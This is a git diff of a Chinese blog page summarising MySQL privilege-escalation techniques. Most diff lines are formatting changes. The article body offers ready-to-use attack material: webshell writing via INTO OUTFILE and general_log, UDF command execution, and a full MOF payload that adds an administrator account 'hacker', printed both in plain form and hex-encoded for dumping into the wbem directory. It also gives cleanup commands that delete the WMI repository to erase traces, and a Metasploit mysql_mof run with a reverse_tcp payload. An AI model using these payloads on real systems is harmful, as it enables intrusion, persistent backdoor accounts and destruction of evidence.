@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="MySQL提权方式总结os-shell &#x2F; into outfile   知道网站物理路径   高权限数据库用户   load_file() 开启 即 secure_file_priv 无限制   网站路径有写入权限  123456mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;+---------------">
+    <meta name="description" content="MySQL提权方式总结os-shell &#x2F; into outfile 知道网站物理路径 高权限数据库用户 load_file() 开启 即 secure_file_priv 无限制 网站路径有写入权限  123456mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;+------------------">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MySQL提权方式总结">
 <meta property="og:url" content="https://wh0is.xyz/articles/82bffd74/index.html">
 <meta property="og:site_name" content="syyu&#39;s Blog">
-<meta property="og:description" content="MySQL提权方式总结os-shell &#x2F; into outfile   知道网站物理路径   高权限数据库用户   load_file() 开启 即 secure_file_priv 无限制   网站路径有写入权限  123456mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;+---------------">
+<meta property="og:description" content="MySQL提权方式总结os-shell &#x2F; into outfile 知道网站物理路径 高权限数据库用户 load_file() 开启 即 secure_file_priv 无限制 网站路径有写入权限  123456mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;+------------------">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-12-18T12:40:56.000Z">
 <meta property="article:modified_time" content="2024-08-08T13:53:26.786Z">
@@ -72,9 +72,11 @@
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/">项目</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/syyu6">项目</a></li><!--
      -->
       </ul>
     </span>
@@ -165,22 +167,22 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="MySQL提权方式总结"><a href="#MySQL提权方式总结" class="headerlink" title="MySQL提权方式总结"></a>MySQL提权方式总结</h1><h2 id="os-shell-into-outfile"><a href="#os-shell-into-outfile" class="headerlink" title="os-shell / into outfile"></a>os-shell / into outfile</h2><ul>
-<li>  知道网站物理路径</li>
-<li>  高权限数据库用户</li>
-<li>  load_file() 开启 即 secure_file_priv 无限制</li>
-<li>  网站路径有写入权限</li>
+    <h1 id="MySQL提权方式总结"><a href="#MySQL提权方式总结" class="headerlink" title="MySQL提权方式总结"></a>MySQL提权方式总结</h1><h2 id="os-shell-into-outfile"><a href="#os-shell-into-outfile" class="headerlink" title="os-shell &#x2F; into outfile"></a>os-shell &#x2F; into outfile</h2><ul>
+<li>知道网站物理路径</li>
+<li>高权限数据库用户</li>
+<li>load_file() 开启 即 secure_file_priv 无限制</li>
+<li>网站路径有写入权限</li>
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="日志文件写shell"><a href="#日志文件写shell" class="headerlink" title="日志文件写shell"></a>日志文件写shell</h2><ul>
-<li>  Web 文件夹宽松权限可以写入</li>
-<li>  高权限运行 MySQL 或者 Apache</li>
+<li>Web 文件夹宽松权限可以写入</li>
+<li>高权限运行 MySQL 或者 Apache</li>
 </ul>
 <p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/c1595d3a029a.log |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="built_in">log</span> |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure>
 
 <p><code>general_log</code> 默认关闭，</p>
 <p>开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
@@ -212,7 +214,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></table></figure>
 
 <p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; <span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的</p>
 <h3 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
@@ -220,19 +222,19 @@
 <h3 id="UDFshell"><a href="#UDFshell" class="headerlink" title="UDFshell"></a>UDFshell</h3><p>不出网的话， 无法直连MySQL</p>
 <h3 id="UDF-PHP"><a href="#UDF-PHP" class="headerlink" title="UDF.PHP"></a>UDF.PHP</h3><p><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">t00ls UDF.PHP</a> 简单方便，一键 DUMP UDF 和函数，操作门槛降低了很多：</p>
 <p>或者 使用 Navicat 自带的 tunnel 隧道脚本 ， 类似于 reGeorg</p>
-<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:/Windows/system32/wbem/mof/目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
 <p>mof 脚本的内容如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>核心 payload 为：</p>
 <figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p>MySQL 写文件的特性将这个 MOF 文件导入到 C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式：</p>
+<p>MySQL 写文件的特性将这个 MOF 文件导入到 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下，依然采用上述编码的方式：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure>
 
-<p>执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 否则出现在 c:/windows/system32/wbem/bad 目录下：</p>
+<p>执行成功的的时候，test.mof 会出现在：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;goog&#x2F; 目录下 否则出现在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad 目录下：</p>
 <h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line"><span class="built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
 
 <h3 id="MSF-MOF-提权"><a href="#MSF-MOF-提权" class="headerlink" title="MSF MOF 提权"></a>MSF MOF 提权</h3><p>MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="comment"># 设置好自己的 payload</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 10.211.55.21</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>
@@ -269,9 +271,11 @@
         
           <li><a href="/">首页</a></li>
         
+          <li><a href="/search/">搜索</a></li>
+        
           <li><a href="/archives/">归档</a></li>
         
-          <li><a target="_blank" rel="noopener" href="http://github.com/">项目</a></li>
+          <li><a target="_blank" rel="noopener" href="http://github.com/syyu6">项目</a></li>
         
       </ul>
     </div>
@@ -327,9 +331,11 @@
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/">项目</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/syyu6">项目</a></li><!--
      -->
       </ul>
     </nav>
